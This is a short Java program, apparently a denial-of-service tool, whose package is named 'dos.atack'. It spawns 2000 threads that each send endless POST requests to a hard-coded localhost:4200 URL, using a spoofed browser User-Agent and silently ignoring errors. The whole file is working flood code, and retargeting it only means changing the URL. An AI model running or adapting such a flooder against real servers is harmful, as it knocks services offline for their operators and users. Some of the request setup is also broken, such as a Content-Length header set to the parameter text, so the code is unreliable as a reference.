
package dos.atack;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    
    public static void main(String[] args)throws Exception {
        for(int i=0;i<2000;i++){
        DdosThread thread=new DdosThread();
        thread.start();
        }
    }
    public static class DdosThread extends Thread{
     private final AtomicBoolean running=new AtomicBoolean(true);
     private final String request="http://localhost:4200";
     private final URL url;
     String param=null;
     public DdosThread()throws Exception{
     url=new URL(request);
     param="param="+URLEncoder.encode("87845","UTF-8");
     }
     @Override
     public void run(){
     while (running.get()){
     try{
     attack();
     }catch(Exception e){
     }
     }
     }

        private void attack() throws Exception {
            HttpURLConnection connection=(HttpURLConnection)url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset","utf-8");
            connection.setRequestProperty("Host","localhost");
            connection.setRequestProperty("User-Agent","Mozilla/5.0(windows NT 6.1;WOW64;rv:8.0)Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length",param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
            
           
        }
     
    }
    
}